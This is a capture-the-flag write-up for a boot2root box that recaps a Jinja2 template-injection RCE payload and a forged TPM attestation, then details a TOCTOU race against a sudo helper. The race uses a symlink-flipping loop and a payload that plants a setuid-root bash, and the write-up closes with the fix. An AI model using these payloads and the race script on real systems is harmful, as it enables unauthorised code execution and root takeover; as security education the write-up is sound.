# KeyStone-Root

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{a_pcr_is_a_promise_not_proof}`

---

Target: `10.48.177.211` - "Keystone - Attestation Portal".
Flag format: `isfcr{...}`.

**Status: SOLVED.**

| Flag |
|---|
| `isfcr{a_pcr_is_a_promise_not_proof}` |

This is the **Root** half of the KeyStone boot2root. The User half (`/home/tpm-admin/user.txt`)
is documented separately in `../KeyStone-User/WRITEUP.md`; this file covers the privilege
escalation from `tpm-admin` to `root` and the `/root/root.txt` capture.

---

## 0. Prerequisite (recap of the foothold)

Root requires a shell as `tpm-admin`, obtained in the User stage:

* **Recon:** only `22` (OpenSSH 9.2p1, Debian 12) and `80` (nginx → Flask "Attestation Portal")
  are open. The docs leak: the vault source at `/opt/vault/main.go`, the AK at TPM handle
  `0x81000001`, a `sudo` helper `measure-and-run` that extends **PCR 23**, and
  `/etc/measure/allowed-hashes.txt`.
* **Portal RCE:** Jinja2 SSTI in `/review?doc=` →
  `{{cycler.__init__.__globals__.os.popen('id').read()}}` → RCE as **`webapp`**
  (member of the `tpm` group).
* **Forge the attestation:** `/opt/vault/main.go` verifies a client-supplied AK's quote but
  performs **no credential activation** (no `TPM2_MakeCredential`/`ActivateCredential` binding
  the AK to the system EK). Present your own RSA key, sign a hand-built `TPMS_ATTEST`
  (magic `TPM_GENERATED_VALUE`, type `TPM_ST_ATTEST_QUOTE`, `extraData == nonce`,
  `pcrDigest == SHA256(pcr0||pcr1||pcr7)` with all three pinned to zero) → the vault releases
  `tpm-admin`'s ed25519 SSH key → `ssh -i tpm-admin.key tpm-admin@10.48.177.211`.

Full script and detail: `../KeyStone-User/WRITEUP.md` §2 - §3.

---

## 1. Enumerating sudo - the planted helper

```
$ sudo -l
(root) NOPASSWD: /usr/sbin/measure-and-run *
```

The `~/race` directory is pre-staged with the intended primitives:

```
safe            # copy of /bin/true  (sha256 c79bf442... -> ON the allowlist)
evil            # bash payload: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
link -> evil    # symlink we will flip
```

## 2. The bug - TOCTOU double-open in `measure-and-run`

Decompiling `/usr/sbin/measure-and-run` (a setuid-invoked helper) reveals:

1. `open(argv[1])` → `mmap` + `SHA256` the **contents** of that path.
2. `tpm2_pcrextend 23:sha256=<hash>` (extend PCR 23).
3. Read `/etc/measure/allowed-hashes.txt`; `strcmp` the hash against each line.
4. On match: print `"policy ok, launching..."`, **`usleep(20000)`** (20 ms), then
5. **`open(argv[1])` *again* by path** → `fexecve()`.

Steps 1 and 5 open the **same path twice**, separated by a fixed 20 ms sleep - a textbook
time-of-check / time-of-use race. If `argv[1]` is a symlink that points at `safe` during the
hash/allowlist check but at `evil` during the re-open, the **allowlisted hash is approved**
yet **the attacker payload is executed as root**.

## 3. Winning the race

Run the helper repeatedly against the symlink while a tight loop flips `link` between
`safe` and `evil`:

```bash
cd /home/tpm-admin/race
( while true; do ln -sfn evil link; ln -sfn safe link; done ) &   # toggler
for i in $(seq 1 4000); do
  sudo /usr/sbin/measure-and-run /home/tpm-admin/race/link >/dev/null 2>&1
  [ -u /tmp/rootbash ] && { echo "WON after $i"; break; }
done
```

* `hash=safe`, `reopen=evil` → **win** (payload runs as root)
* `hash=evil` → hash not on the allowlist, aborts harmlessly
* both `safe` → runs `/bin/true`, harmless

Won after **10 attempts**. A setuid-root bash was dropped:

```bash
ls -l /tmp/rootbash          # -rwsr-xr-x root root
/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1003(tpm-admin) euid=0(root)
# isfcr{a_pcr_is_a_promise_not_proof}
```

## 4. Root cause & fix

| Stage | Flaw | Fix |
|-------|------|-----|
| `measure-and-run` | TOCTOU: hashes a path, then **re-opens it by path** to `exec` | Open once, verify and `fexecve` the **same fd** (never re-resolve the path); drop the sleep |

## 5. Takeaway

*"A PCR is a promise not proof"*: extending/checking a PCR value proves nothing about what
actually runs *after* the measurement when the measured file can be swapped between check and
use. The measurement must be bound to the **executed object** (fd), not to the path.

